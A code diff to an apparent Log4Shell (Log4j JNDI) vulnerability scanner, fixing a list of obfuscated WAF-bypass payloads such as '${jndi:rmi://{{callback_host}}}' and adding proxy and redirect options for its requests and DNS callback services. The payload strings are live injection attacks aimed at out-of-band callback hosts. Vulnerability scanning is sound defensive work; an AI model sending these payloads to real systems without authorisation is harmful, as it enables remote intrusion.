@@ -49,11 +49,12 @@ default_headers = {
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
+
 waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
                        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
                        "${jndi:rmi://{{callback_host}}}",
-                       "${${lower:jndi}:${lower:rmi}://{{callback_Host}}/{{random}}}",
-                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host/{{random}}}",
+                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}}"]
@@ -62,6 +63,10 @@ parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
                     dest="url",
                     help="Check a single URL.",
+                    action='store')
+parser.add_argument("-p", "--proxy",
+                    dest="proxy",
+                    help="send requests through proxy",
                     action='store')
 parser.add_argument("-l", "--list",
                     dest="usedlist",
@@ -104,9 +109,17 @@ parser.add_argument("--custom-dns-callback-host",
                     dest="custom_dns_callback_host",
                     help="Custom DNS Callback Host.",
                     action='store')
+parser.add_argument("--disable-http-redirects",
+                    dest="disable_redirects",
+                    help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
+                    action='store_true')
 
 args = parser.parse_args()
 
+
+proxies = {}
+if args.proxy:
+    proxies = {"http": args.proxy, "https": args.proxy}
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
@@ -143,11 +156,15 @@ def generate_waf_bypass_payloads(callback_host, random_string):
 class Dnslog(object):
     def __init__(self):
         self.s = requests.session()
-        req = self.s.get("http://www.dnslog.cn/getdomain.php", timeout=30)
+        req = self.s.get("http://www.dnslog.cn/getdomain.php",
+                         proxies=proxies,
+                         timeout=30)
         self.domain = req.text
 
     def pull_logs(self):
-        req = self.s.get("http://www.dnslog.cn/getrecords.php", timeout=30)
+        req = self.s.get("http://www.dnslog.cn/getrecords.php",
+                         proxies=proxies,
+                         timeout=30)
         return req.json()
 
 
@@ -173,6 +190,8 @@ class Interactsh:
 
         self.session = requests.session()
         self.session.headers = self.headers
+        self.session.verify = False
+        self.session.proxies = proxies
         self.register()
 
     def register(self):
@@ -255,7 +274,9 @@ def scan_url(url, callback_host):
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -268,7 +289,9 @@ def scan_url(url, callback_host):
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -280,7 +303,9 @@ def scan_url(url, callback_host):
                                  headers=get_fuzzing_headers(payload),
                                  json=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout,
+                                 allow_redirects=(not args.disable_redirects),
+                                 proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -322,7 +347,7 @@ def main():
 
     cprint("[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.", "cyan")
     cprint("[•] Waiting...", "cyan")
-    time.sleep(args.wait_time)
+    time.sleep(int(args.wait_time))
     records = dns_callback.pull_logs()
     if len(records) == 0:
         cprint("[•] Targets does not seem to be vulnerable.", "green")
